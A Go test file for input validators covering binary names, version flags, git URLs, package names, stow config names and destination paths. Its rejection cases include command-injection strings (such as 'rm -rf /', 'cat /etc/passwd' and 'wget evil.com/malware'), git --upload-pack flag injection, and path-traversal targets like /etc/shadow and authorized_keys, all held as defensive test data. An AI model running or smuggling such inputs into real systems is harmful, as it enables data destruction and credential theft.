package validation

import (
	"strings"
	"testing"
)

func TestValidateBinaryName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid inputs
		{name: "simple name", input: "myapp", wantErr: false},
		{name: "with hyphen", input: "my-app", wantErr: false},
		{name: "with underscore", input: "my_app", wantErr: false},
		{name: "with dot", input: "my.app", wantErr: false},
		{name: "numeric", input: "app123", wantErr: false},
		{name: "mixed valid chars", input: "my-app_v2.0", wantErr: false},
		{name: "single char", input: "a", wantErr: false},
		{name: "all dots and dashes", input: "a.b-c_d", wantErr: false},

		// Empty string
		{name: "empty string", input: "", wantErr: true},

		// Starts with hyphen (flag injection)
		{name: "starts with hyphen", input: "-myapp", wantErr: true},
		{name: "starts with double hyphen", input: "--version", wantErr: true},

		// Path separators
		{name: "forward slash", input: "path/to/app", wantErr: true},
		{name: "backslash", input: `path\to\app`, wantErr: true},

		// Shell metacharacters
		{name: "semicolon", input: "app;rm -rf /", wantErr: true},
		{name: "pipe", input: "app|cat", wantErr: true},
		{name: "ampersand", input: "app&bg", wantErr: true},
		{name: "dollar sign", input: "app$HOME", wantErr: true},
		{name: "backtick", input: "app`id`", wantErr: true},
		{name: "parentheses", input: "app()", wantErr: true},
		{name: "curly braces", input: "app{}", wantErr: true},
		{name: "angle brackets", input: "app<>", wantErr: true},
		{name: "exclamation", input: "app!", wantErr: true},
		{name: "asterisk", input: "app*", wantErr: true},
		{name: "question mark", input: "app?", wantErr: true},
		{name: "square brackets", input: "app[]", wantErr: true},
		{name: "tilde", input: "~app", wantErr: true},
		{name: "hash", input: "app#", wantErr: true},
		{name: "single quote", input: "app'", wantErr: true},
		{name: "double quote", input: `app"`, wantErr: true},

		// Whitespace
		{name: "space in name", input: "my app", wantErr: true},
		{name: "tab in name", input: "my\tapp", wantErr: true},
		{name: "newline in name", input: "my\napp", wantErr: true},

		// Max length
		{name: "at max length", input: strings.Repeat("a", 255), wantErr: false},
		{name: "over max length", input: strings.Repeat("a", 256), wantErr: true},

		// Security-focused: command injection attempts
		{name: "command injection semicolon", input: "app;id", wantErr: true},
		{name: "command injection backtick", input: "app`whoami`", wantErr: true},
		{name: "command injection dollar paren", input: "app$(id)", wantErr: true},
		{name: "command injection pipe", input: "app|cat /etc/passwd", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateBinaryName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateBinaryName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateVersionCmd(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid inputs (whitelist)
		{name: "double dash version", input: "--version", wantErr: false},
		{name: "lowercase v", input: "-v", wantErr: false},
		{name: "uppercase V", input: "-V", wantErr: false},
		{name: "version word", input: "version", wantErr: false},

		// Invalid inputs
		{name: "empty string", input: "", wantErr: true},
		{name: "arbitrary flag", input: "--help", wantErr: true},
		{name: "command injection", input: "--version; rm -rf /", wantErr: true},
		{name: "pipe injection", input: "-v | cat /etc/passwd", wantErr: true},
		{name: "single dash", input: "-", wantErr: true},
		{name: "random text", input: "hello", wantErr: true},
		{name: "version with space", input: "-- version", wantErr: true},
		{name: "exec flag", input: "--exec=rm", wantErr: true},
		{name: "backtick injection", input: "`id`", wantErr: true},
		{name: "subshell injection", input: "$(whoami)", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateVersionCmd(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateVersionCmd(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateGitURL(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid HTTPS URLs
		{name: "https github", input: "https://github.com/user/repo.git", wantErr: false},
		{name: "https gitlab", input: "https://gitlab.com/user/repo.git", wantErr: false},
		{name: "https without .git", input: "https://github.com/user/repo", wantErr: false},
		{name: "https with path", input: "https://example.com/deep/path/repo.git", wantErr: false},

		// Valid SSH URLs
		{name: "ssh github", input: "git@github.com:user/repo.git", wantErr: false},
		{name: "ssh gitlab", input: "git@gitlab.com:user/repo.git", wantErr: false},
		{name: "ssh custom host", input: "git@my-server.example.com:org/repo.git", wantErr: false},

		// Empty string
		{name: "empty string", input: "", wantErr: true},

		// Flag injection
		{name: "starts with hyphen", input: "-victim", wantErr: true},
		{name: "starts with double hyphen", input: "--upload-pack=evil", wantErr: true},
		{name: "flag injection upload-pack", input: "--upload-pack=malicious", wantErr: true},

		// file:// scheme
		{name: "file scheme", input: "file:///etc/passwd", wantErr: true},
		{name: "file scheme uppercase", input: "FILE:///etc/passwd", wantErr: true},
		{name: "file scheme mixed case", input: "File:///etc/passwd", wantErr: true},

		// Invalid formats
		{name: "http not https", input: "http://github.com/user/repo.git", wantErr: true},
		{name: "ftp scheme", input: "ftp://github.com/user/repo.git", wantErr: true},
		{name: "just a path", input: "/home/user/repo", wantErr: true},
		{name: "relative path", input: "../evil/repo", wantErr: true},
		{name: "plain text", input: "not a url at all", wantErr: true},

		// Security-focused
		{name: "injection in ssh", input: "git@$(whoami):user/repo.git", wantErr: true},
		{name: "newline injection", input: "https://github.com/user/repo\n--upload-pack=evil", wantErr: true},

		// Shell metacharacters in URL body
		{name: "space in https url", input: "https://evil.com/repo --upload-pack=evil", wantErr: true},
		{name: "semicolon in https url", input: "https://evil.com/repo;rm -rf /", wantErr: true},
		{name: "pipe in https url", input: "https://evil.com/repo|cat /etc/passwd", wantErr: true},
		{name: "backtick in https url", input: "https://evil.com/`whoami`/repo", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitURL(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateGitURL(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidatePackageName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid inputs
		{name: "simple name", input: "curl", wantErr: false},
		{name: "with hyphen", input: "node-js", wantErr: false},
		{name: "with underscore", input: "my_pkg", wantErr: false},
		{name: "with dot", input: "python3.11", wantErr: false},
		{name: "with plus", input: "g++", wantErr: false},
		{name: "scoped npm package", input: "@scope/package", wantErr: false},
		{name: "with at-sign", input: "pkg@latest", wantErr: false},
		{name: "complex valid", input: "lib-name_v2.0+build@latest", wantErr: false},

		// Empty string
		{name: "empty string", input: "", wantErr: true},

		// Starts with hyphen (flag injection)
		{name: "starts with hyphen", input: "-package", wantErr: true},
		{name: "starts with double hyphen", input: "--install-suggests", wantErr: true},

		// Shell metacharacters
		{name: "semicolon", input: "pkg;rm -rf /", wantErr: true},
		{name: "pipe", input: "pkg|cat", wantErr: true},
		{name: "ampersand", input: "pkg&bg", wantErr: true},
		{name: "dollar sign", input: "pkg$HOME", wantErr: true},
		{name: "backtick", input: "pkg`id`", wantErr: true},
		{name: "parentheses", input: "pkg()", wantErr: true},
		{name: "curly braces", input: "pkg{}", wantErr: true},
		{name: "exclamation", input: "pkg!", wantErr: true},
		{name: "asterisk", input: "pkg*", wantErr: true},
		{name: "question mark", input: "pkg?", wantErr: true},
		{name: "space", input: "my package", wantErr: true},

		// Max length
		{name: "at max length", input: strings.Repeat("a", 255), wantErr: false},
		{name: "over max length", input: strings.Repeat("a", 256), wantErr: true},

		// Security-focused
		{name: "command injection", input: "curl;wget evil.com/malware", wantErr: true},
		{name: "subshell injection", input: "$(curl evil.com)", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePackageName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePackageName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateConfigName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid inputs
		{name: "simple name", input: "vim", wantErr: false},
		{name: "with hyphen", input: "my-config", wantErr: false},
		{name: "with underscore", input: "my_config", wantErr: false},
		{name: "with dot", input: "config.d", wantErr: false},
		{name: "with plus", input: "c++", wantErr: false},
		{name: "with at-sign", input: "config@v2", wantErr: false},
		{name: "alphanumeric", input: "zsh2", wantErr: false},

		// Empty string
		{name: "empty string", input: "", wantErr: true},

		// Starts with hyphen (flag injection via stow)
		{name: "starts with hyphen", input: "-config", wantErr: true},
		{name: "starts with double hyphen", input: "--target=/etc", wantErr: true},

		// Path separators
		{name: "forward slash", input: "path/config", wantErr: true},
		{name: "backslash", input: `path\config`, wantErr: true},

		// Shell metacharacters
		{name: "semicolon", input: "cfg;rm", wantErr: true},
		{name: "pipe", input: "cfg|cat", wantErr: true},
		{name: "ampersand", input: "cfg&bg", wantErr: true},
		{name: "dollar sign", input: "cfg$HOME", wantErr: true},
		{name: "backtick", input: "cfg`id`", wantErr: true},
		{name: "space", input: "my config", wantErr: true},

		// Max length
		{name: "at max length", input: strings.Repeat("a", 255), wantErr: false},
		{name: "over max length", input: strings.Repeat("a", 256), wantErr: true},

		// Security-focused: stow flag injection
		{name: "stow target flag", input: "--target=/etc", wantErr: true},
		{name: "stow dir flag", input: "--dir=/tmp/evil", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateConfigName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateConfigName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateDestinationPath(t *testing.T) {
	tests := []struct {
		name     string
		expanded string
		baseDir  string
		wantErr  bool
	}{
		// Valid paths
		{name: "subdir of base", expanded: "/home/user/.config/vim", baseDir: "/home/user", wantErr: false},
		{name: "exact base dir", expanded: "/home/user", baseDir: "/home/user", wantErr: false},
		{name: "deep subdir", expanded: "/home/user/.config/nvim/init.vim", baseDir: "/home/user", wantErr: false},
		{name: "with dots in name", expanded: "/home/user/.dotfiles", baseDir: "/home/user", wantErr: false},
		{name: "normalized path", expanded: "/home/user/./config", baseDir: "/home/user", wantErr: false},

		// Empty inputs
		{name: "empty expanded", expanded: "", baseDir: "/home/user", wantErr: true},
		{name: "empty base dir", expanded: "/home/user/.config", baseDir: "", wantErr: true},
		{name: "both empty", expanded: "", baseDir: "", wantErr: true},

		// Relative path inputs (must be absolute)
		{name: "relative expanded path", expanded: "config/vim", baseDir: "/home/user", wantErr: true},
		{name: "relative base dir", expanded: "/home/user/config", baseDir: "home/user", wantErr: true},

		// Path traversal attacks
		{name: "parent traversal", expanded: "/home/user/../../etc/shadow", baseDir: "/home/user", wantErr: true},
		{name: "escape to root", expanded: "/etc/passwd", baseDir: "/home/user", wantErr: true},
		{name: "escape with dotdot", expanded: "/home/user/../../../tmp/evil", baseDir: "/home/user", wantErr: true},
		{name: "sibling directory", expanded: "/home/other/config", baseDir: "/home/user", wantErr: true},
		{name: "escape to system dir", expanded: "/usr/bin/evil", baseDir: "/home/user", wantErr: true},

		// Dotdot-prefixed directory name (should not false-positive)
		{name: "dotdot-prefixed dir name is allowed", expanded: "/base/..foo", baseDir: "/base", wantErr: false},

		// Security-focused: real attack patterns
		{name: "shadow file attack", expanded: "/home/user/../../etc/shadow", baseDir: "/home/user", wantErr: true},
		{name: "crontab injection", expanded: "/var/spool/cron/root", baseDir: "/home/user", wantErr: true},
		{name: "ssh key overwrite", expanded: "/root/.ssh/authorized_keys", baseDir: "/home/user", wantErr: true},
		{name: "systemd service injection", expanded: "/etc/systemd/system/evil.service", baseDir: "/home/user", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDestinationPath(tt.expanded, tt.baseDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDestinationPath(%q, %q) error = %v, wantErr %v", tt.expanded, tt.baseDir, err, tt.wantErr)
			}
		})
	}
}
